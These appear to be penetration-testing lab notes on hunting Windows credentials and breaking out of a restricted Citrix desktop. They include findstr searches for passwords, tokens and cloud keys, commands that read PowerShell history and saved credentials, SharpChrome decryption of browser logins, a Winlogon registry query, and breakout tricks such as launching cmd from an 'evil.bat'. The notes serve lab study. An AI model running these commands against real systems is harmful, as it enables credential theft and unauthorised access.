# Credential Hunting 
## Tools 
[Lazagne](https://github.com/AlessandroZ/LaZagne)

[SessionGopher](https://github.com/Arvanaghi/SessionGopher)

[Snaffler.exe](https://github.com/SnaffCon/Snaffler)

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

[SharpDpapiInstallation](https://deepwiki.com/GhostPack/SharpDPAPI/1.1-installation-and-setup)

## Machine
```
findstr /SIM /C:"password", "bob" *.txt *.ini *.cfg *.config *.xml  
```
```
findstr /I /S /N /C:"password" /C:"secret" /C:"api_key" /C:"apikey" /C:"token" /C:"credential" /C:"private_key" /C:"connection_string" /C:"client_secret" /C:"aws_access" /C:"azure_key" /C:"stripe" /C:"webhook" *.*
```
```
findstr /I /S /N /C:"password" *.env *.config *.json *.yaml *.yml *.xml *.properties *.ini *.cfg *.pem *.key *.p12 *.pfx *.crt
```
```
findstr /si password *.xml *.ini *.txt *.config
```

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

```
(Get-PSReadLineOption).HistorySavePath #displaying history save path
```
```
gc (Get-PSReadLineOption).HistorySavePath #reading information from history save path
```

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml' #[!note|Cleartext credential gathering]
```

```
cmdkey /list
```
## Browser 
```
\SharpChrome.exe logins /unprotect
```
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
**Sticky Notes**
```
C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqli
```

## Misc 
##  Citrix Breakout

- Sometimes environments are restricted and users are unable to access files and locations that they normally would be able to access 

- Using programs or applications that are allowed is a way to "breakout " of these environments 
- **Breaking Out Of File Explorer Steps**
	- 1. Run application that is allowed (Microsoft Paint)
	- 2. Click file > open to open the dialog box 
	- 3. Enter the ==UNC== path
```
\\\127.0.0.1\c$\users\pmorgan
```
 under the file name field, with file-type set to All Files 
- **Accessing SMB share from restricted environment **
	1. Start smb server on ubuntu machine that is hosting the citrix environment(NOT THE ATTACK MACHINE) 
	2. In the citrix environment initiate paint application. navigate to the file menu and select "open". Within dialog box, enter the path as the attacker ip address\share 
	3. Ensure file-type paramater is configured to all files 
**Alternate Explorers & Registries  **
- Alternate file system editors can be employed as work around, as well as different registry editors 
**Shortcut Files**
- Can be edited to allow unauthorized access or created to create unaothorized access 
- 1. Right click on desired shortcut 
- 2. Select properties 
- 3. Within target field, modify path to intended folder for access
**Script Execution **
1. Create new text file and name it "evil.bat" 
2. Open "evil.bat" with a text editor such as notepad
3. Input cmd into file.Literally just 'cmd'
4. Save file and execute 
